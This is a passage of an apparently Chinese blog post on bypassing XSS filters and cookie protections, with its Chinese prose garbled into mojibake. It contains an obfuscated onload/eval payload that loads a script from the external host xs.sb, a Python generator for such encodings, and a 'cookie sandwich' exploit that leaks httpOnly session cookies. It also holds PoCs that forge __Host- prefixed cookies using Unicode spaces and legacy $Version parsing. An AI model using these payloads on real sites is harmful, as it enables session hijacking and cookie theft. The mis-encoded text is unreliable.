class="language-markup">&lt;body/onload=eval("\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x36\x37\x2c\x31\x31\x34\x2c\x37\x33\x2c\x31\x31\x32\x2c\x31\x31\x36\x2c\x33\x32\x2c\x31\x31\x35\x2c\x31\x31\x34\x2c\x36\x37\x2c\x36\x31\x2c\x34\x37\x2c\x34\x37\x2c\x31\x32\x30\x2c\x31\x31\x35\x2c\x34\x36\x2c\x31\x31\x35\x2c\x39\x38\x2c\x34\x37\x2c\x38\x39\x2c\x38\x34\x2c\x38\x35\x2c\x31\x30\x34\x2c\x36\x32\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x36\x37\x2c\x38\x32\x2c\x31\x30\x35\x2c\x31\x31\x32\x2c\x38\x34\x2c\x36\x32\x29\x29\x3b")>&lt;!--document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,47,47,120,115,46,115,98,47,89,84,85,104,62,60,47,115,67,82,105,112,84,62));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åå…­è¿›åˆ¶å­—ç¬¦ä¸²ç”Ÿæˆï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span> <span class="token string">"&lt;sCrIpt srC=//xs.sb/YTUh>&lt;/sCRipT>"</span>res <span class="token operator">=</span> <span class="token string">''</span>res2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>  tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>  res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  res<span class="token operator">+=</span><span class="token string">","</span>  res2 <span class="token operator">+=</span><span class="token string-interpolation"><span class="token string">f"document.write(String.fromCharCode(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">));"</span></span><span class="token comment"># print(res)</span><span class="token comment"># print(res2)</span><span class="token comment">#-------------ç”Ÿæˆè„šæœ¬åˆ†ä¸ºä¸Šä¸‹2ä¸ªï¼Œä¸Šé¢çš„æ˜¯ç”Ÿæˆæ²¡è¿‡æ»¤.çš„è„šæœ¬---------------</span>a <span class="token operator">=</span> <span class="token string">"646f63756d656e742e777269746528537472696e672e66726f6d43686172436f64652836302c3131352c36372c3131342c37332c3131322c3131362c33322c3131352c3131342c36372c36312c34372c34372c3132302c3131352c34362c3131352c39382c34372c38392c38342c38352c3130342c36322c36302c34372c3131352c36372c38322c3130352c3131322c38342c363229293b"</span>z <span class="token operator">=</span> <span class="token number">0</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>  <span class="token keyword">if</span> z <span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>    z<span class="token operator">=</span><span class="token number">0</span>  <span class="token keyword">if</span> z <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>    res<span class="token operator">+=</span><span class="token string">r"\x"</span>  res <span class="token operator">+=</span> i  z<span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»„ä»¶é˜²æŠ¤ç»•è¿‡"><a href="#ç»„ä»¶é˜²æŠ¤ç»•è¿‡" class="headerlink" title="ç»„ä»¶é˜²æŠ¤ç»•è¿‡"></a>ç»„ä»¶é˜²æŠ¤ç»•è¿‡</h1><h2 id="DOMPurify"><a href="#DOMPurify" class="headerlink" title="DOMPurify"></a>DOMPurify</h2><p>bypass version &lt; 3.2.4ï¼š</p><p><a href="https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251">https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251</a></p><p><a href="https://ensy.zip/posts/dompurify-323-bypass/">https://ensy.zip/posts/dompurify-323-bypass/</a></p><p>DOMPurify å…è®¸ img æ ‡ç­¾</p><p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists">https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists</a></p><hr><h1 id="åŸç”Ÿé˜²æŠ¤ç»•è¿‡"><a href="#åŸç”Ÿé˜²æŠ¤ç»•è¿‡" class="headerlink" title="åŸç”Ÿé˜²æŠ¤ç»•è¿‡"></a>åŸç”Ÿé˜²æŠ¤ç»•è¿‡</h1><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>è§å¦ä¸€ç¯‡åšå®¢ <a href="/blog/2023/12/12/CSP/">ã€ŠCSPã€‹</a></p><hr><h2 id="httpOnly"><a href="#httpOnly" class="headerlink" title="httpOnly"></a>httpOnly</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/Cookies">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/Cookies</a></p><blockquote><p>JavaScriptÂ <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie"><code>Document.cookie</code></a>Â API æ— æ³•è®¿é—®å¸¦æœ‰Â <code>HttpOnly</code>Â å±æ€§çš„ cookie</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´å¯¹ xss å¸¦å‡º cookie é€ æˆäº†é™åˆ¶</p><h3 id="cookie-sandwich-technique"><a href="#cookie-sandwich-technique" class="headerlink" title="cookie sandwich technique"></a>cookie sandwich technique</h3><p><a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique</a></p><h4 id="é™çº§-cookie-è§£æå™¨"><a href="#é™çº§-cookie-è§£æå™¨" class="headerlink" title="é™çº§ cookie è§£æå™¨"></a>é™çº§ cookie è§£æå™¨</h4><p><a href="https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie">https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie</a></p><p>å…³äº http cookie çš„æ ‡å‡†ï¼Œç¬¬ä¸€ä¸ªæ˜¯ RFC 2109ï¼ˆå°½ç®¡ç°ä»£æµè§ˆå™¨ä¸æ”¯æŒï¼Œä½†æ˜¯è®¸å¤š web æœåŠ¡å™¨ä»ç„¶æ”¯æŒï¼‰ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">$Version=1; foo="bar"; $Path="/"; $Domain=abc;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>$Version</code> æ˜¯å¿…é¡»æŒ‡å®šçš„å±æ€§ï¼Œç”¨äºæ ‡è¯† cookie è§„èŒƒçš„ç‰ˆæœ¬ï¼Œè€Œ <code>$Version=1</code> è¿™ä¸ªæ ‡å‡†ä¸‹ï¼Œåœ¨ç”¨<strong>åŒå¼•å·æ‹¬èµ·æ¥</strong>æ—¶ï¼Œä¸€ä¸ª cookie å€¼å¯ä»¥åŒ…å«ç©ºæ ¼ã€åˆ†å·å’Œç­‰å·</p><p>ç°ä»£è¯­è¨€æ¡†æ¶ä¸­å¯¹ cookie å¤´çš„è§£æï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">Flask<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"foo"</span><span class="token operator">:</span><span class="token string">"bar"</span><span class="token punctuation">,</span><span class="token property">"$Version"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"$Path"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token property">"$Domain"</span><span class="token operator">:</span><span class="token string">"abc"</span><span class="token punctuation">&#125;</span>Django<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"foo"</span><span class="token operator">:</span><span class="token string">"bar"</span><span class="token punctuation">,</span><span class="token property">"$Version"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"$Path"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token property">"$Domain"</span><span class="token operator">:</span><span class="token string">"abc"</span><span class="token punctuation">&#125;</span>PHP<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"foo"</span><span class="token operator">:</span><span class="token string">"\"bar\""</span><span class="token punctuation">,</span><span class="token property">"$Version"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"$Path"</span><span class="token operator">:</span><span class="token string">"\"\/\""</span><span class="token punctuation">,</span><span class="token property">"$Domain"</span><span class="token operator">:</span><span class="token string">"abc"</span><span class="token punctuation">&#125;</span>Ruby<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"foo"</span><span class="token operator">:</span><span class="token string">"\"bar\""</span><span class="token punctuation">,</span><span class="token property">"$Version"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"$Path"</span><span class="token operator">:</span><span class="token string">"\"\/\""</span><span class="token punctuation">,</span><span class="token property">"$Domain"</span><span class="token operator">:</span><span class="token string">"abc"</span><span class="token punctuation">&#125;</span>Spring<span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"foo"</span><span class="token operator">:</span> <span class="token string">"\"bar\""</span><span class="token punctuation">&#125;</span>SimpleCookie<span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"foo"</span><span class="token operator">:</span> <span class="token string">"bar"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾å®ƒä»¬çš„è§£ææ–¹å¼å¹¶æ²¡æœ‰ç»Ÿä¸€</p><p>åœ¨ SpringBoot 2 + Apache Tomcat v.9.0.83 ä¸­ï¼Œå¯¹äº cookie çš„å¤„ç†æ–¹å¼å¦‚ä¸‹ï¼š</p><ul><li>èƒ½å¤Ÿå¤„ç† RFC6265 å’Œ RFC2109 ï¼Œå¦‚æœå­—ç¬¦ä¸²ä»¥ <code>$Version</code> å±æ€§å¼€å¤´ï¼Œåˆ™é»˜è®¤ä½¿ç”¨æ—§ç‰ˆè§£æé€»è¾‘</li><li>å¦‚æœ cookie å€¼ä»¥åŒå¼•å·å¼€å¤´ï¼Œå®ƒå°†ç»§ç»­è¯»å–å­—ç¬¦ç›´åˆ°ä¸‹ä¸€ä¸ªæœªè½¬ä¹‰çš„åŒå¼•å·ï¼Œå³å€¼ä¸ºåŒå¼•å·æ‹¬èµ·æ¥çš„å†…å®¹ã€‚</li><li>æ”¯æŒ <code>$Path</code> å’Œ <code>$Domain</code> å±æ€§ï¼Œå¦‚æœåœ¨å“åº”ä¹‹å‰æœªæ­£ç¡®æ£€æŸ¥åå°„çš„ cookie å±æ€§ï¼Œåˆ™å¯èƒ½å…è®¸ç”¨æˆ·æ›´æ”¹åå°„çš„ cookie å±æ€§ï¼Œå¹¶ä¸”è§£æå™¨å°†å–æ¶ˆè½¬ä¹‰ä»»ä½•ä»¥åæ–œæ  ï¼ˆ\ï¼‰ å¼€å¤´çš„å­—ç¬¦</li></ul><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">$Version=1; foo="\b\a\r"; $Path=/abc; $Domain=example.com</span></span><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">foo="bar"; Path=/abc; Domain=example.com</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°åŸå…ˆçš„ <code>\b\a\r</code> è¢«é‡æ–°è®¾ç½®ä¸ºäº† <code>bar</code>ï¼Œåœ¨ç»•è¿‡ waf ä¸Šåˆè§ç«¯å€ª</p><br><p>åœ¨ Python çš„ SimpleCookie ä¸­ï¼Œé”®å€¼å¯¹æ”¯æŒæ—§ç‰ˆ cookie å±æ€§ï¼Œé‚£ä¹ˆå°±å’Œä¸Šé¢ä¸€æ ·å¯ä»¥æ³¨å…¥æ—§ç‰ˆ cookie å±æ€§æ¥å–æ¶ˆè½¬ä¹‰ç»•è¿‡æŸäº›é™åˆ¶ã€‚</p><p>è€Œæ‰€æœ‰åŸºäº Python çš„æ¡†æ¶ï¼ˆFlaskã€Django ç­‰ï¼‰éƒ½å…è®¸å¸¦å¼•å·çš„ cookie å€¼ï¼Œä½†æ˜¯æ— æ³•è¯†åˆ« <code>$Version</code> ä¸€ç±»çš„ magic stringï¼Œä¼šå°†å…¶è§†ä¸ºæ™®é€šçš„ cookie åï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨è§£ç å¸¦å¼•å·çš„å­—ç¬¦ä¸²ä¸­çš„å…«è¿›åˆ¶è½¬ä¹‰åºåˆ—ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">"\012"</span> <span class="token operator">&lt;=</span><span class="token operator">></span> \n  <span class="token string">"\015"</span> <span class="token operator">&lt;=</span><span class="token operator">></span> \r  <span class="token string">"\073"</span> <span class="token operator">&lt;=</span><span class="token operator">></span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>å®é™…ç»•è¿‡ waf çš„åˆ©ç”¨åœ¨å‚è€ƒæ–‡ç« ä¸­è®²å¾—å¾ˆæ˜ç™½äº†ï¼Œæˆ‘ä»¬çš„é¦–è¦ç›®æ ‡æ˜¯è§£å†³ httpOnlyï¼Œæ‰€ä»¥ç•¥è¿‡</em></p><hr><h4 id="Cookie-sandwich"><a href="#Cookie-sandwich" class="headerlink" title="Cookie sandwich"></a>Cookie sandwich</h4><p>ç°ä»£çš„ Chrome æµè§ˆå™¨ï¼ˆåŒ…æ‹¬ xssbot åœ¨å†…ï¼‰ä¸æ”¯æŒæ—§ç‰ˆ cookieï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åˆ›å»ºä»¥ <code>$</code> å¼€å¤´çš„ Cookie åç§°ï¼Œä¾‹å¦‚ <code>$Version</code>ï¼Œæµè§ˆå™¨åªä¼šè§†ä¸ºæ™®é€šå­—ç¬¦ä¸²ï¼›è€Œå‰é¢æè¿‡ï¼Œæ—§ç‰ˆ cookie æ”¯æŒ<strong>åŒå¼•å·æ‹¬èµ·æ¥</strong>çš„éƒ¨åˆ†ä¸ºæ•´ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ ä¸‹é¢è¿™æ ·ä¸€ä¸ª cookieï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">$Version=1;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">param1="start</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token comment">// any cookies inside the sandwich will be placed into param1 value server-side</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">param2=end";</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶çš„è¯·æ±‚å’Œå“åº”ä¼šå˜æˆè¿™æ ·ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">$Version=1; param1="start; sessionId=secret; param2=end"</span></span><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">param1="start; sessionId=secret; param2=end";</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å“åº”çš„ cookie æ˜¯ param1 ï¼Œå…¶å€¼ä¸º <code>start; sessionId=secret; param2=end</code></p><p>å¦‚æœåº”ç”¨ç¨‹åºåœ¨å“åº”ä¸­èƒ½å¤Ÿè¿”å›ä¸€ä¸ªå¯æ§çš„ cookie é”®å¦‚è¿™é‡Œçš„ param1 æˆ–è€…æ²¡æœ‰è®¾ç½® httpOnlyï¼Œé‚£ä¹ˆå³ä½¿æ˜¯ httpOnly ä¼šè¯é‡Œçš„æ•´ä¸ª cookie éƒ½å¯ä»¥è¢«æ‹¬èµ·æ¥è§†ä¸ºå­—ç¬¦ä¸²å…¬å¼€å‡ºæ¥</p><p>expï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sandwich</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> cookie</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Step 1: Create an iframe with target src and wait for it</span>    <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> domain <span class="token operator">=</span> url<span class="token punctuation">.</span>hostname<span class="token punctuation">;</span>    <span class="token keyword">const</span> path <span class="token operator">=</span> url<span class="token punctuation">.</span>pathname<span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> target<span class="token punctuation">;</span>    <span class="token comment">// Hide the iframe</span>    iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Optional: Add your code to check and clean client's cookies if needed</span>    iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Step 2: Create cookie gadget</span>        document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">$Version=1; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>domain<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>path<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>cookie<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">="deadbeef; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>domain<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>path<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">dummy=qaz"; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>domain<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=/;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        <span class="token comment">// Step 3: Send a fetch request</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>target<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> responseData <span class="token operator">=</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Step 4: Alert response</span>            <span class="token function">alert</span><span class="token punctuation">(</span>responseData<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error fetching data:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span>sandwich<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'http://example.com/json'</span><span class="token punctuation">,</span> <span class="token string">'session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Host-amp-Secure-Prefix"><a href="#Host-amp-Secure-Prefix" class="headerlink" title="__Host &amp; __Secure Prefix"></a>__Host &amp; __Secure Prefix</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Set-Cookie">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Set-Cookie</a></p><p><a href="https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes">https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes</a></p><p><strong><code>__Host-</code>Â å‰ç¼€</strong>ï¼šä»¥Â <code>__Host-</code>Â ä¸ºå‰ç¼€çš„ cookieï¼Œå¿…é¡»ä¸Â <code>secure</code>Â æ ‡å¿—ä¸€åŒè®¾ç½®ï¼Œå¿…é¡»åº”ç”¨äºå®‰å…¨é¡µé¢ï¼ˆHTTPSï¼‰ï¼Œä¹Ÿç¦æ­¢æŒ‡å®š domain å±æ€§ï¼ˆä¹Ÿå°±ä¸ä¼šå‘é€ç»™å­åŸŸåï¼Œå³ä¸èƒ½è·¨å­åŸŸå…±äº«ï¼‰ï¼ŒåŒæ—¶ path å±æ€§çš„å€¼å¿…é¡»ä¸ºÂ <code>/</code>ã€‚</p><p><strong><code>__Secure-</code>Â å‰ç¼€</strong>ï¼šä»¥Â <code>__Secure-</code>Â ä¸ºå‰ç¼€çš„ cookieï¼ˆè¿æ¥ç¬¦æ˜¯å‰ç¼€çš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œå¿…é¡»ä¸Â <code>secure</code>Â æ ‡å¿—ä¸€åŒè®¾ç½®ï¼ŒåŒæ—¶å¿…é¡»åº”ç”¨äºå®‰å…¨é¡µé¢ï¼ˆHTTPSï¼‰ã€‚</p><p>è¿™ä¸¤ä¸ªé™åˆ¶ç”±æµè§ˆå™¨å¼ºåˆ¶æ‰§è¡Œï¼Œä»¥é˜²æ­¢ cookie tossing ï¼ˆå­åŸŸååœ¨çˆ¶åŸŸåä¸Šè®¾ç½® cookieï¼‰æˆ–ä¼šè¯å›ºå®šç­‰æ”»å‡»</p><p>ä½†æ˜¯æ ¹æ®Â <a href="https://datatracker.ietf.org/doc/html/rfc6265#:~:text=NOTE%3A%20Despite%20its,valid%20UTF%2D8.">RFC 6265</a>ï¼Œcookie å¤´è¢«å®šä¹‰ä¸ºå…«è¿›åˆ¶çš„å­—èŠ‚åºåˆ—ï¼Œè€Œä¸æ˜¯å­—ç¬¦ã€‚è¿™æ„å‘³ç€æµè§ˆå™¨é€šè¿‡ç½‘ç»œå‘é€åŸå§‹å­—èŠ‚ï¼ŒæœåŠ¡å™¨è´Ÿè´£å°†è¿™äº›å­—èŠ‚è§£ç ä¸ºå­—ç¬¦ä¸²ã€‚å¦‚æœæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼è§£é‡Šè¿™äº›å­—èŠ‚ï¼Œåˆ™å¯èƒ½ä¼šå‡ºç°è§£æå·®å¼‚ã€‚</p><h3 id="unicode-ç©ºæ ¼"><a href="#unicode-ç©ºæ ¼" class="headerlink" title="unicode ç©ºæ ¼"></a>unicode ç©ºæ ¼</h3><p>ç»“è®ºï¼šé€šè¿‡ä½¿ç”¨ UTF-8 ç¼–ç ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡å¦‚ <code>__Host</code> å‰ç¼€è¿™ç§é€šè¿‡æµè§ˆå™¨çš„ä¿æŠ¤ï¼Œä»è€Œä¼ªè£…å—é™åˆ¶çš„ cookieã€‚æµè§ˆå™¨ä¼šå°†å…¶è§£é‡Šä¸ºä¸å—é™åˆ¶çš„ cookieï¼Œè€ŒæœåŠ¡å™¨èƒ½å¤Ÿå°†å…¶è§£é‡Šä¸ºå—ä¿æŠ¤çš„ cookie</p><p>pocï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>String<span class="token punctuation">.</span><span class="token function">fromCodePoint</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">__Host-name=injected; Domain=.example.com; Path=/;</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ­¤å¤„æ˜¯ä¸€ä¸ªç©ºæ ¼åœ¨ __Host-name å‰ï¼Œæµè§ˆå™¨ä¼šè§£é‡Šä¸ºæ— å‰ç¼€ã€æ— é™åˆ¶çš„å€¼ï¼Œäºæ˜¯å°±ä¼šå‘åˆ°å…¶å­åŸŸ</p><p>æŸäº›æœåŠ¡å™¨ç«¯æ¡†æ¶ï¼Œä¾‹å¦‚ Django å’Œ ASP.NETï¼Œä¼šè§„èŒƒå¤„ç† cookieï¼Œå½“æœåŠ¡å™¨å°† U+2000 è§£é‡Šä¸ºç©ºæ ¼å­—ç¬¦æ—¶ï¼Œå®ƒä¼šå°†å…¶åˆ é™¤ï¼Œä»è€Œç”Ÿæˆç­‰æ•ˆäº __Host-name çš„ cookie åç§°ã€‚</p><h3 id="æ—§ç‰ˆè§£æ"><a href="#æ—§ç‰ˆè§£æ" class="headerlink" title="æ—§ç‰ˆè§£æ"></a>æ—§ç‰ˆè§£æ</h3><p>å³ä¸Šé¢æåˆ°çš„é™çº§ cookie è§£æå™¨çš„æ–¹æ³•</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h3><p>å‘ç°äº†å­˜å‚¨å‹ XSSï¼Œä½†æ˜¯åœ¨å­åŸŸä¸Šï¼Œç›®æ ‡æ˜¯è¦†ç›–çˆ¶åŸŸä¸Šçš„ cookie</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>String<span 